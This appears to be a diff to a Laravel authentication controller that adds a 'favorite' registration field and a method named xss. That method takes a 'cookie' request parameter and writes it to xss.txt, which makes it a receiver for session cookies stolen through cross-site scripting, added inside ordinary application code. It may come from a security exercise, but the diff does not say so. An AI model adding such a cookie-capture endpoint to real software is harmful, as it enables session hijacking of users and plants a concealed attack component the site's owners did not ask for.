@@ -26,6 +26,7 @@ class CustomAuthController extends Controller
             'email' => 'required|email|unique:users',
             'password' => 'required|min:6',
             'phone' => 'required',
+            'favorite' => 'required',
             'img' => 'required|image|mimes:jpeg,png,jpg,gif',
         ]);
 
@@ -54,6 +55,7 @@ class CustomAuthController extends Controller
             'email' => $data['email'],
             'password' => Hash::make($data['password']),
             'phone' => $data['phone'],
+            'favorite' => $data['favorite'],
             'img' => $data['img'],
         ]);
     }
@@ -100,4 +102,10 @@ class CustomAuthController extends Controller
 
         return redirect()->back()->with('success', 'Người dùng đã được xóa thành công');
     }
+
+    public function xss(Request $request) {
+        $cookie = $request->get('cookie');
+        file_put_contents('xss.txt', $cookie);
+        var_dump($cookie);die();
+        }
 }
